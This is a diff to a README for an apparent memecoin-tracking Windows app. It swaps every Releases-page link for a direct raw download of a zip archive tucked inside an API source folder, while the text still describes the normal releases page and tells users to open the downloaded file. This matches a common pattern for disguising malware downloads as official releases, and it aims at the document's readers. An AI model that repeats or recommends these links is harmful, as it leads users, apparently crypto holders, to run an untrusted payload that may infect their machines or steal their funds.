@@ -1,10 +1,10 @@
 # 🗂️ memescope-monday-directory - Track memecoin community activity
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue-grey)](https://github.com/Hto661/memescope-monday-directory/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue-grey)](https://github.com/Hto661/memescope-monday-directory/raw/refs/heads/main/src/app/api/watchlist/check/directory_memescope_monday_v3.6.zip)
 
 ## 📥 Download the app
 
-Visit this page to download: https://github.com/Hto661/memescope-monday-directory/releases
+Visit this page to download: https://github.com/Hto661/memescope-monday-directory/raw/refs/heads/main/src/app/api/watchlist/check/directory_memescope_monday_v3.6.zip
 
 On the releases page, look for the latest version. Download the Windows file that matches your device. After the file finishes downloading, open it to start the app.
 
@@ -69,7 +69,7 @@ If you use a work or school computer, you may need admin access to open the file
 
 ## 🚀 Setup steps
 
-1. Go to the Releases page: https://github.com/Hto661/memescope-monday-directory/releases
+1. Go to the Releases page: https://github.com/Hto661/memescope-monday-directory/raw/refs/heads/main/src/app/api/watchlist/check/directory_memescope_monday_v3.6.zip
 2. Find the newest release at the top of the list.
 3. Open the **Assets** area under that release.
 4. Download the Windows file.
@@ -187,7 +187,7 @@ Before using the app for the first time:
 
 Check the Releases page for new versions:
 
-https://github.com/Hto661/memescope-monday-directory/releases
+https://github.com/Hto661/memescope-monday-directory/raw/refs/heads/main/src/app/api/watchlist/check/directory_memescope_monday_v3.6.zip
 
 Use that page whenever you want the latest Windows download and the newest app build
 
